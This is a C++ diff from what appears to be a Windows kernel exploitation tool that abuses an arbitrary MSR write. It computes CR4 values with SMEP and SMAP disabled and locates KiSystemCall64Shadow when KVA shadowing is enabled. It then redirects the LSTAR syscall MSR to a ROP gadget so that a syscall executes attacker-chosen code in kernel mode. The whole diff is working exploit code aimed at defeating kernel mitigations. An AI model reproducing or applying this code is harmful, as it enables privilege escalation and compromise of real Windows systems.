@@ -22,7 +22,6 @@ namespace vdm
 			if (!find_globals())
 				std::printf("> failed to find globals...\n");
 
-		// this is a guess aided by cpuid feature checks...
 		cpuid_eax_01 cpuid_info;
 		__cpuid((int*)&cpuid_info, 1);
 
@@ -34,31 +33,33 @@ namespace vdm
 		cr4_value.page_size_extensions = true;
 		cr4_value.machine_check_enable = true;
 
-		cr4_value.physical_address_extension = 
+		cr4_value.physical_address_extension =
 			cpuid_info.cpuid_feature_information_edx.physical_address_extension;
 
-		cr4_value.os_fxsave_fxrstor_support = 
+		cr4_value.os_fxsave_fxrstor_support =
 			cpuid_info.cpuid_feature_information_edx.fxsave_fxrstor_instructions;
 
 		cr4_value.os_xmm_exception_support = true;
 
-		cr4_value.fsgsbase_enable = 
+		cr4_value.fsgsbase_enable =
 			IsProcessorFeaturePresent(PF_RDWRFSGSBASE_AVAILABLE);
 
-		cr4_value.os_xsave = 
+		cr4_value.os_xsave =
 			IsProcessorFeaturePresent(PF_XSAVE_ENABLED);
 
-		cr4_value.pcid_enable = 
+		cr4_value.pcid_enable =
 			cpuid_info.cpuid_feature_information_ecx
-			.process_context_identifiers;
+				.process_context_identifiers;
 
 		m_smep_off.flags = cr4_value.flags;
 		m_smep_off.smep_enable = false;
+		m_smep_off.smap_enable = false; // newer spus have this on...
 
 		// WARNING: some virtual machines dont have SMEP...
 		// my VMWare VM doesnt... nor does my Virtual Box VM...
 		m_smep_on.flags = cr4_value.flags;
-		m_smep_on.smap_enable = cpuid_features.ebx.smep;
+		m_smep_on.smep_enable = cpuid_features.ebx.smep;
+		m_smep_on.smap_enable = cpuid_features.ebx.smap;
 
 		ntoskrnl_base = 
 			reinterpret_cast<void*>(
@@ -75,6 +76,9 @@ namespace vdm
 		std::printf("> m_kpcr_rsp_offset -> 0x%x\n", m_kpcr_rsp_offset);
 		std::printf("> m_kpcr_krsp_offset -> 0x%x\n", m_kpcr_krsp_offset);
 		std::printf("> m_system_call -> 0x%p\n", m_system_call);
+
+		std::printf("> m_smep_off -> 0x%p\n", m_smep_off.flags);
+		std::printf("> m_smep_on -> 0x%p\n", m_smep_on.flags);
 
 		std::printf("> check to make sure none of these^ are zero before pressing enter...\n");
 		std::getchar();
@@ -135,6 +139,41 @@ namespace vdm
 
 		m_kpcr_rsp_offset = *reinterpret_cast<std::uint32_t*>(ki_system_call + 8);
 		m_kpcr_krsp_offset = *reinterpret_cast<std::uint32_t*>(ki_system_call + 17);
+
+		// handle KVA shadowing... if KVA shadowing is enabled LSTAR will point at KiSystemCall64Shadow...
+		SYSTEM_KERNEL_VA_SHADOW_INFORMATION kva_info = { 0 };
+
+		// if SystemKernelVaShadowInformation is not a valid class just 
+		// return true and assume LSTAR points to KiSystemCall64...
+		if (NT_SUCCESS(NtQuerySystemInformation(SystemKernelVaShadowInformation, &kva_info, sizeof(kva_info), nullptr)))
+		{
+			if (kva_info.KvaShadowFlags.KvaShadowEnabled)
+			{				
+				const auto [section_data, section_rva] =
+					utils::pe::get_section(
+						reinterpret_cast<std::uintptr_t>(
+							LoadLibraryA("ntoskrnl.exe")), "KVASCODE");
+
+				// no KVASCODE section so there is no way for LSTAR to be KiSystemCall64Shadow...
+				if (!section_rva || section_data.empty())
+					return true;
+
+				const auto ki_system_shadow_call =
+					utils::scan(reinterpret_cast<std::uintptr_t>(
+						section_data.data()), section_data.size(),
+							KI_SYSCALL_SHADOW_SIG, KI_SYSCALL_SHADOW_MASK);
+
+				// already set m_syscall_call so we just return true...
+				if (!ki_system_shadow_call)
+					return true; 
+
+				// else we update m_system_call with KiSystemCall64Shadow...
+				m_system_call = (ki_system_shadow_call -
+					reinterpret_cast<std::uintptr_t>(
+						section_data.data())) + section_rva +
+							utils::kmodule::get_base("ntoskrnl.exe");
+			}
+		}
 		return true;
 	}
 
@@ -146,12 +185,8 @@ namespace vdm
 			GetThreadPriority(GetCurrentThread()) 
 		};
 
-		// make it so our thread is highest possible priority...
 		SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
 		SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
-
-		// we want to finish off our quantum...
-		while (!SwitchToThread());
 
 		// set LSTAR to first rop gadget... race begins here...
 		if (!wrmsr(IA32_LSTAR_MSR, m_pop_rcx_gadget))
@@ -160,7 +195,6 @@ namespace vdm
 			// go go gadget kernel execution...
 			syscall_wrapper(&kernel_callback);
 
-		// reset thread priority...
 		SetPriorityClass(GetCurrentProcess(), thread_info.first);
 		SetThreadPriority(GetCurrentThread(), thread_info.second);
 	}
